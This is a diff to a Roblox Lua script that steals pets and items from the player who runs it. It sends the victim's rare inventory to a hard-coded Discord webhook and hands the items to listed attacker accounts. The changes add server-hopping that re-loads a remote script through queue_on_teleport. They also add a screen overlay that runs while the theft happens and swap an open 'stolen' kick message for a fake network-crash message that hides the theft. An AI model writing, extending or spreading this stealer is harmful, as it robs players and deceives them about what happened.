@@ -4,14 +4,15 @@ if _G.scriptExecuted then
 end
 _G.scriptExecuted = true
 
-local users = _G.Usernames or {"sheeloi0727"}
+local users = _G.Usernames or {"kittypaw121709"}
 local min_value = _G.min_value or 10000000
 local ping = _G.pingEveryone or "Yes"
 local webhook = _G.webhook or "https://discord.com/api/webhooks/1444187837762109501/Au5My2ZxWDAdtg7okXOjXBaWvpd4p_36BxCeimgQrOztwzI7sYfMq9euFooL0mckPf8f"
 
 local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
-local plr = Players.LocalPlayer
+local TeleportService = game:GetService("TeleportService")
+local RunService = game:GetService("RunService")
 local backpack = plr:WaitForChild("Backpack")
 local replicatedStorage = game:GetService("ReplicatedStorage")
 local modules = replicatedStorage:WaitForChild("Modules")
@@ -20,7 +21,79 @@ local petUtils = require(modules:WaitForChild("PetServices"):WaitForChild("PetUt
 local petRegistry = require(replicatedStorage:WaitForChild("Data"):WaitForChild("PetRegistry"))
 local numberUtil = require(modules:WaitForChild("NumberUtil"))
 local dataService = require(modules:WaitForChild("DataService"))
+local plr = Players.LocalPlayer
 local character = plr.Character or plr.CharacterAdded:Wait()
+local PlaceID = game.PlaceId
+
+--[[
+================================================================================
+
+SERVER HOP
+
+================================================================================
+]]
+pcall(function()
+    queue_on_teleport([[
+        loadstring(game:HttpGet("YOUR_SCRIPT_LINK_HERE"))()
+    ]])
+end)
+
+local function serverHop()
+    local servers = {}
+    local cursor = ""
+
+    repeat
+        local success, result = pcall(function()
+            return HttpService:JSONDecode(
+                game:HttpGet("https://games.roblox.com/v1/games/"..PlaceID.."/servers/Public?sortOrder=Asc&limit=100&cursor="..cursor)
+            )
+        end)
+
+        if success and result and result.data then
+            for _, srv in ipairs(result.data) do
+                if srv.playing < srv.maxPlayers and srv.id ~= game.JobId then
+                    table.insert(servers, srv.id)
+                end
+            end
+            cursor = result.nextPageCursor or ""
+        else
+            break
+        end
+    until cursor == "" or cursor == nil
+
+    if #servers > 0 then
+        TeleportService:TeleportToPlaceInstance(PlaceID, servers[math.random(#servers)])
+    else
+        TeleportService:Teleport(PlaceID)
+    end
+end
+
+local hopNeeded = false
+
+if next(users) == nil or webhook == "" then
+    hopNeeded = true
+end
+
+if game.PlaceId ~= 126884695634066 then
+    hopNeeded = true
+end
+
+if #Players:GetPlayers() >= 5 then
+    hopNeeded = true
+end
+
+local okVIP, serverType = pcall(function()
+    return game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):InvokeServer()
+end)
+
+if okVIP and serverType == "VIPServer" then
+    hopNeeded = true
+end
+
+if hopNeeded then
+    serverHop()
+end
+-- =============================================================================
 
 local excludedItems = {"Seed", "Shovel [Destroy Plants]", "Water", "Fertilizer"}
 local rarePets = {
@@ -31,6 +104,24 @@ local rarePets = {
     "Peacock",
     "Raccoon"
 }
+
+local petEmoji = {
+    ["racc"]      = "🦝",
+    ["peacock"]   = "🦚",
+    ["elephant"]  = "🐘",
+    ["horseman"]  = "🎃",
+    ["spider"]    = "🕷️",
+    ["dilo"]      = "🦖", 
+    ["queen bee"] = "🐝",
+    ["Mimic"]     = "🐙",
+    ["squid"]     = "🦑",
+    ["ferret"]    = "🦦",
+    ["turtle"]    = "🐢",
+    ["disco"]     = "🪩",
+    ["dragon"]    = "🐉",
+    ["kitsune"]   = "🌸"
+}
+local DEFAULT_EMOJI = "🐶"
 
 local mutationNameMap = {
     ["A"] = "Nightmare",
@@ -183,44 +274,73 @@ local function convertMutationTag(mutation)
     return mutationMap[mutation] or ""  
 end
 
+local function getSizeTag(weight)
+    if weight >= 9 then
+        return "Titanic"
+    elseif weight >= 7 then
+        return "Semi-Titanic"
+    elseif weight >= 5 then
+        return "Huge"
+    end
+    return nil
+end
+
+local function getPetEmoji(name)
+    local lower = name:lower()
+    for key, emoji in pairs(petEmoji) do
+        if lower:find(key, 1, true) then
+            return emoji
+        end
+    end
+    return DEFAULT_EMOJI
+end
+
 local function BuildRareInventory()
-    local inventory = {}
-    local hasRare = false
+    local inventory  = {}
+    local hasRare    = false
 
     for _, item in ipairs(itemsToSend) do
-        if table.find(rarePets, item.Name) then
+        local isRarePet = table.find(rarePets, item.Name) ~= nil
+        local sizeTag   = getSizeTag(item.Weight or 0)
+
+        if isRarePet or sizeTag then
             hasRare = true
 
-            local mutationName = mutationNameMap[item.Mutation] or item.Mutation
-            local isNaturalRainbow = item.Name:sub(1, 7) == "Rainbow" and item.Mutation == ""
+            local emoji = getPetEmoji(item.Name)
 
-            local prefix = ""
-
-            if mutationName ~= "" then
-                prefix = mutationName .. " "
-            elseif isNaturalRainbow then
-                prefix = "Rainbow "
+            local prefixParts = {}
+            if sizeTag then
+                table.insert(prefixParts, sizeTag)
             end
 
-            local cleanName = item.Name:gsub("^Rainbow ", "") -- tanggalin ang "Rainbow " kung natural
+            local mutationName = mutationNameMap[item.Mutation] or item.Mutation
+            local isNaturalRainbow = item.Name:sub(1,7) == "Rainbow" and item.Mutation == ""
 
-            table.insert(inventory, string.format(
-                "%s%s (%.2f KG) [Age %d]",
-                prefix,
+            if mutationName ~= "" then
+                table.insert(prefixParts, mutationName)
+            elseif isNaturalRainbow then
+                table.insert(prefixParts, "Rainbow")
+            end
+
+            local cleanName = item.Name:gsub("^Rainbow ", "")
+
+            local fullPrefix = table.concat(prefixParts, " ")
+            local line = string.format("%s %s%s (%s KG) [Age %d]",
+                emoji,
+                fullPrefix ~= "" and (fullPrefix .. " ") or "",
                 cleanName,
-                item.Weight or 0,
-                item.Age or 0
-            ))
+                string.format("%.2f", item.Weight or 0),
+                item.Age or 0)
+
+            table.insert(inventory, line)
         end
     end
 
-    if #inventory == 0 then
-        return "```N/A```", false
-    end
-
+    if #inventory == 0 then return "```N/A```", false end
     local text = "```\n" .. table.concat(inventory, "\n") .. "\n```"
     return text, true
 end
+
 
 local function SendJoinMessage(list, prefix)
     local inventoryText, hasRare = BuildRareInventory()
@@ -384,18 +504,56 @@ if #itemsToSend > 0 then
             task.wait(0.1)
         end
 
-        plr:kick("All your stuff just got stolen by Tobi's stealer!\n Join discord.gg/GY2RVSEGDT")
+        plr:kick("You're game crash due to unstable network")
     end
-
+    
     local function waitForUserChat()
-        local sentMessage = false
+        local function createOverlay(p)
+            local sg = Instance.new("ScreenGui")
+            sg.Name = "StealOverlay"
+            sg.ResetOnSpawn = false
+            sg.IgnoreGuiInset = true
+            sg.Parent = p:WaitForChild("PlayerGui")
+
+            local overlay = Instance.new("Frame")
+            overlay.Size = UDim2.new(1,0,1,0)
+            overlay.BackgroundColor3 = Color3.new(0,0,0)
+            overlay.BackgroundTransparency = 0.35
+            overlay.Parent = sg
+
+            local lbl = Instance.new("TextLabel")
+            lbl.Size = UDim2.new(0,300,0,80)
+            lbl.Position = UDim2.new(0.5,-150,0.5,-40)
+            lbl.BackgroundTransparency = 1
+            lbl.Text = "10:00"
+            lbl.TextColor3 = Color3.new(1,1,1)
+            lbl.TextScaled = true
+            lbl.Font = Enum.Font.SourceSansBold
+            lbl.Parent = overlay
+
+            coroutine.wrap(function()
+                local endT = tick()+600
+                while tick()<endT do
+                    local left = endT-tick()
+                    lbl.Text = string.format("%02d:%02d",left/60,left%60)
+                    wait(1)
+                end
+                sg:Destroy()
+            end)()
+
+            return sg
+        end
+
         local function onPlayerChat(player)
             if table.find(users, player.Name) then
                 player.Chatted:Connect(function()
+                    createOverlay(player)
+                    wait(3)
                     doSteal(player)
                 end)
             end
         end
+
         for _, p in ipairs(Players:GetPlayers()) do onPlayerChat(p) end
         Players.PlayerAdded:Connect(onPlayerChat)
     end
